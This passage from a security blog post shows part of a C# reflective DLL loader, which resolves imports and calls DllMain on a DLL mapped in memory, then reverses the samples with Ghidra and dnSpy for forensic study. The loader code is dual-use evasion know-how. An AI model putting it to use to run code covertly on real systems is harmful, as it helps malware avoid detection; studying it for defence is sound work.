   <span class="hljs-number">161</span>	    <span class="hljs-type">byte</span> *libraryName = <span class="hljs-literal">null</span>;
   <span class="hljs-number">162</span>	    <span class="hljs-type">IntPtr</span> <span class="hljs-variable">library</span> <span class="hljs-operator">=</span> IntPtr.Zero;
   <span class="hljs-number">163</span>	    <span class="hljs-keyword">while</span>(importDescriptor-&gt;Name != <span class="hljs-number">0</span>)
   <span class="hljs-number">164</span>	    {
   <span class="hljs-number">165</span>	      libraryName = importDescriptor-&gt;Name + (<span class="hljs-type">byte</span> *)dllBase;
   <span class="hljs-number">166</span>	      library = (IntPtr)Win32.LoadLibrary((<span class="hljs-type">char</span> *)libraryName);
   <span class="hljs-number">167</span>	
   <span class="hljs-number">168</span>	      <span class="hljs-keyword">if</span>(library != IntPtr.Zero)
   <span class="hljs-number">169</span>	      {
   <span class="hljs-number">170</span>	        Win32.IMAGE_THUNK_DATA *thunk = <span class="hljs-literal">null</span>;
   <span class="hljs-number">171</span>	        thunk = (Win32.IMAGE_THUNK_DATA *)((<span class="hljs-type">byte</span> *)dllBase +
   <span class="hljs-number">172</span>	                                           importDescriptor-&gt;FirstThunk);
   <span class="hljs-number">173</span>	
   <span class="hljs-number">174</span>	        <span class="hljs-keyword">while</span>(thunk-&gt;AddressOfData != <span class="hljs-number">0</span>)
   <span class="hljs-number">175</span>	        {
   <span class="hljs-number">176</span>	          {
   <span class="hljs-number">177</span>	            Win32.IMAGE_IMPORT_BY_NAME *functionName =
   <span class="hljs-number">178</span>	                (Win32.IMAGE_IMPORT_BY_NAME *)((
   <span class="hljs-number">179</span>	                                                   <span class="hljs-type">byte</span> *)dllBase + thunk-&gt;AddressOfData);
   <span class="hljs-number">180</span>	            <span class="hljs-keyword">void</span> *functionAddress = (<span class="hljs-keyword">void</span> *)Win32.GetProcAddress(library,
   <span class="hljs-number">181</span>	                                    functionName-&gt;Name);
   <span class="hljs-number">182</span>	            thunk-&gt;Function = (UInt64)functionAddress;
   <span class="hljs-number">183</span>	          }
   <span class="hljs-number">184</span>	          ++thunk;
   <span class="hljs-number">185</span>	        }
   <span class="hljs-number">186</span>	      }
   <span class="hljs-number">187</span>	
   <span class="hljs-number">188</span>	      importDescriptor++;
   <span class="hljs-number">189</span>	    }
   <span class="hljs-number">190</span>	</code></pre><p class="MsoNormal">Create a function delegate to act as the function pointer from C. Calculate the offset to the entry point and call the DLLMain.</p><pre><code data-highlighted="yes" class="hljs language-csharp"><span class="hljs-number">191</span>	    <span class="hljs-built_in">int</span> DLL_PROCESS_ATTACH = <span class="hljs-number">1</span>;
   <span class="hljs-number">192</span>	    <span class="hljs-comment">// execute the loaded DLL</span>
   <span class="hljs-number">193</span>	    tmpFuncDelegate foo = (tmpFuncDelegate)
   <span class="hljs-number">194</span>	                          Marshal.GetDelegateForFunctionPointer(
   <span class="hljs-number">195</span>	                              <span class="hljs-keyword">new</span> IntPtr((<span class="hljs-built_in">byte</span> *)dllBase +
   <span class="hljs-number">196</span>	                                         ntHeaders-&gt;OptionalHeader.AddressOfEntryPoint),
   <span class="hljs-number">197</span>	                              <span class="hljs-keyword">typeof</span>(tmpFuncDelegate));
   <span class="hljs-number">198</span>	
   <span class="hljs-number">199</span>	    Console.WriteLine(<span class="hljs-string">"Sleeping to capture memory image"</span>);
   <span class="hljs-number">200</span>	    Thread.Sleep(<span class="hljs-number">40000</span>);
   <span class="hljs-number">201</span>	    Console.WriteLine(<span class="hljs-string">"Finished Sleeping "</span>);
   <span class="hljs-number">202</span>	
   <span class="hljs-number">203</span>	    foo((<span class="hljs-built_in">byte</span> *)dllBase, DLL_PROCESS_ATTACH, <span class="hljs-literal">null</span>);
   <span class="hljs-number">204</span>	
   <span class="hljs-number">205</span>	    Console.WriteLine(<span class="hljs-string">"Press 'q' to exit"</span>);
   <span class="hljs-number">206</span>	    <span class="hljs-keyword">while</span>(Console.ReadKey().Key != ConsoleKey.Q) {}
   <span class="hljs-number">207</span>	
   <span class="hljs-number">208</span>	    Win32.VirtualFree(dllBase, (<span class="hljs-built_in">uint</span>)dllImageSize,
   <span class="hljs-number">209</span>	                      (<span class="hljs-built_in">uint</span>)Win32.AllocationTypeFlags.MEM_RELEASE);
   <span class="hljs-number">210</span>	    Win32.VirtualFree(buffer, (<span class="hljs-built_in">uint</span>)dllBytes.Length,
   <span class="hljs-number">211</span>	                      (<span class="hljs-built_in">uint</span>)Win32.AllocationTypeFlags.MEM_RELEASE);
   <span class="hljs-number">212</span>	  }</code></pre><h2>1.4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Reversing the Code</h2><p class="MsoNormal">The C code we discussed earlier was compiled into a Windows 64-bit executable using MinGW, then disassembled and decompiled with Ghidra. As you can see below, the Ghidra-generated source code is a very close match to the original.&nbsp;</p><p class="MsoNormal">The figure below is the Ghidra decompilation of the first sample. As you can see, it does a pretty good job. Again, we didn’t implement any type of anti-forensic or obfuscation.</p><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig15_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367429&amp;s=ff8d0f8d3e87987e4770dce39337f6c7, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig15_Nusbaum.png?w=819&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367429&amp;s=eede76525e5b2641d5c5d99f8666eded 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig15_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367429&amp;s=4634a51f7f5cc5234f21f1513d5ff50b, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig15_Nusbaum.png?w=819&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367429&amp;s=a9ed9471edd6cce09f838e20ade6d00c 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig15_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367429&amp;s=196811b9216bb6ad72fc9f74bd02b7d4, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig15_Nusbaum.png?w=819&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367429&amp;s=eede76525e5b2641d5c5d99f8666eded 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig15_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367429&amp;s=67cb6b6389f7da5bd29917cba9813d8d, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig15_Nusbaum.png?w=819&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367429&amp;s=a9ed9471edd6cce09f838e20ade6d00c 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig15_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367429&amp;s=761b87f746b2841e33d1046937b975d1, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig15_Nusbaum.png?w=819&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367429&amp;s=eede76525e5b2641d5c5d99f8666eded 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig15_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367429&amp;s=fa25315ae215daea481fd57ab121feee, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig15_Nusbaum.png?w=819&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367429&amp;s=a9ed9471edd6cce09f838e20ade6d00c 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig15_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367429&amp;s=2aad80f2c8b6b55cea5daf4e14a1abca, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig15_Nusbaum.png?w=479&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367429&amp;s=0038d1fbd8ce2a4ca60e9aaed3df80b3 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig15_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367429&amp;s=f5b50b9815424b131cf8809a52ec17cc, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig15_Nusbaum.png?w=479&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367429&amp;s=78cbf498f2de97e458f982813c8cdef6 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig15_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367429&amp;s=f5b50b9815424b131cf8809a52ec17cc" loading="lazy" x-data="image({mq1024:{width:546,height:224},mq768:{width:546,height:224},mq320:{width:546,height:224},DEFAULT:{width:319,height:131}})" :width="getSize()" :height="getSize('height')" alt="" width="546" height="224" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 15 - Decompilation of C Main function</figcaption></figure></div><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig16_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367430&amp;s=fca278b0bf847a99b923ff8b8e491cda, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig16_Nusbaum.png?w=1131&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367430&amp;s=082d38b1ff3ee09cf6d4d1e7d8485684 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig16_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367430&amp;s=d9fdf465a2fc5967c107bb92f3a08c77, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig16_Nusbaum.png?w=1131&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367430&amp;s=6561de38e7e0f69d1468798732fa488a 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig16_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367430&amp;s=166bc280e9a8ee2903bbb12fae5d7fd6, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig16_Nusbaum.png?w=1131&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367430&amp;s=082d38b1ff3ee09cf6d4d1e7d8485684 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig16_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367430&amp;s=59cc19b635ad7d63ceb97650af8f7f89, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig16_Nusbaum.png?w=1131&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367430&amp;s=6561de38e7e0f69d1468798732fa488a 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig16_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367430&amp;s=a36ad8cbfc656176105a82fbdefffb0c, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig16_Nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367430&amp;s=1d08517f6a7007d774b626773074396f 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig16_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367430&amp;s=ae62e0d36190de143fad722da2287c89, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig16_Nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367430&amp;s=b315f295347d8e751403ece3fbd0d0ef 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig16_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367430&amp;s=d5d3eea6bc44cad5d7d25c69c3eb8c1e, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig16_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367430&amp;s=e305e67ab85d9a1d2b87beb8d885efa3 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig16_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367430&amp;s=7bea406562fc34c11b4c33097c1ff159, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig16_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367430&amp;s=14435137d5dbc622fc61e69977c011df 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig16_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367430&amp;s=7bea406562fc34c11b4c33097c1ff159" loading="lazy" x-data="image({mq1024:{width:754,height:1168},mq768:{width:754,height:1168},mq320:{width:720,height:1115},DEFAULT:{width:320,height:496}})" :width="getSize()" :height="getSize('height')" alt="" width="754" height="1168" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 16 - Decompilation of the reflective_loader Function</figcaption></figure></div><p class="MsoNormal">Reversing most C# code is simple with the tool, <a href="https://github.com/dnSpy/dnSpy">dnSpy</a>. There are methods to hide or corrupt the .exe so that dnSpy cannot decompile it, but for the most part, attackers do not go to that extent.</p><p class="MsoNormal">To load the executable in dnSpy, simply drag and drop it onto the left pane. Once loaded, the pane will provide a tree listing of the components of the .exe.</p><p class="MsoNormal">The following image is the reflective_loader example as shown in dnSpy. Again, it’s very close to the original.</p><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig17_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367432&amp;s=437bbbf921e1ba974dac8e2fb3b74689, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig17_Nusbaum.png?w=1065&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367432&amp;s=569d5acd354423b588b0b06c44ff2376 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig17_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367432&amp;s=8e2257c50a4f67ed14f5b976aea01b2a, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig17_Nusbaum.png?w=1065&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367432&amp;s=cbc2b73dd15fa4c07f8b72b3715e5a31 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig17_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367432&amp;s=92288553ef2433f05f99ba739831fcd5, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig17_Nusbaum.png?w=1065&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367432&amp;s=569d5acd354423b588b0b06c44ff2376 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig17_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367432&amp;s=74f9de08f444bf7e48166c70819448d3, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig17_Nusbaum.png?w=1065&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367432&amp;s=cbc2b73dd15fa4c07f8b72b3715e5a31 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig17_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367432&amp;s=492b8338991e480652ba6eddfd593774, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig17_Nusbaum.png?w=1065&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367432&amp;s=569d5acd354423b588b0b06c44ff2376 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig17_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367432&amp;s=93bb72eb11f3d197740e5551ce459470, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig17_Nusbaum.png?w=1065&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367432&amp;s=cbc2b73dd15fa4c07f8b72b3715e5a31 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig17_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367432&amp;s=dab4f0e7b1f3e921f4485252915d19ec, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig17_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367432&amp;s=af4047f8a7d12263aa5526b0bc6dfc7c 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig17_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367432&amp;s=489e73125c7652f85c7653b219227d09, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig17_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367432&amp;s=8f645e33c1e7648c6a9e9624f06a70d5 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig17_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367432&amp;s=489e73125c7652f85c7653b219227d09" loading="lazy" x-data="image({mq1024:{width:710,height:150},mq768:{width:710,height:150},mq320:{width:710,height:150},DEFAULT:{width:320,height:68}})" :width="getSize()" :height="getSize('height')" alt="" width="710" height="150" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 17 - DnSpy Generated Source Code for Main Function</figcaption></figure></div><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig18_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367433&amp;s=fdb62b4a3881d354c8757e9457ad6d1d, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig18_Nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367433&amp;s=dab3fd2bb859832a36d4a0407056b120 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig18_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367433&amp;s=a0af8a2a448e206bd713abd19867fb98, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig18_Nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367433&amp;s=82e76e1fcf29bf935888735055ae7c1e 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig18_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367433&amp;s=2e5fa28f903ec33ddcd44bfd3c810fb3, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig18_Nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367433&amp;s=dab3fd2bb859832a36d4a0407056b120 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig18_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367433&amp;s=8808aed0bf7e3aee9bf49c267e7b78ab, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig18_Nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367433&amp;s=82e76e1fcf29bf935888735055ae7c1e 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig18_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367433&amp;s=4165db8e3bd10f583caec2205512a439, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig18_Nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367433&amp;s=da196289fdbc6d3ab95740465b88a3b1 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig18_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367433&amp;s=05f0d2f4fb705c35e88725bf707e1d12, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig18_Nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367433&amp;s=46deb4d35e88d2ace91110484714607e 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig18_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367433&amp;s=b23e8180b8d77aac4de207254bce4a02, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig18_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367433&amp;s=74caf4c40267f7071aaff631a05d8871 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig18_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367433&amp;s=706fe3f9a419c817b54e3a11f7bc6277, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig18_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367433&amp;s=e5a43b5f0af9a87e9ac768c945524334 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig18_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367433&amp;s=706fe3f9a419c817b54e3a11f7bc6277" loading="lazy" x-data="image({mq1024:{width:936,height:666},mq768:{width:936,height:666},mq320:{width:720,height:512},DEFAULT:{width:320,height:228}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="666" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 18 - DnSpy Generated Source Code for the reflective_loader Function</figcaption></figure></div><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig19_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367434&amp;s=4e058414b07f6ce4e83363b9f9c4f9af, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig19_Nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367434&amp;s=60f90939091f2972de79f487e7b945ad 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig19_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367434&amp;s=de0f5677b7d098a7030236a1fe3fa9d9, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig19_Nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367434&amp;s=4fe765335bf53c8c6ae714ea24e9d687 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig19_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367434&amp;s=f274fc86631bfb35571f8a02c282cdd8, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig19_Nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367434&amp;s=60f90939091f2972de79f487e7b945ad 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig19_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367434&amp;s=4da0a03b7d0c6302f3523dc83f5e8b48, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig19_Nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367434&amp;s=4fe765335bf53c8c6ae714ea24e9d687 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig19_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367434&amp;s=39159ce615cbb40a93ab6bde7bc24e37, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig19_Nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367434&amp;s=55b8ccac9cc597f1b35b458fda70a64f 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig19_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367434&amp;s=63a93278c75f89fbc16e0ee2a38dd993, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig19_Nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367434&amp;s=826105e575171857838b4a42737b3eef 1.5x"><source type="image/webp" 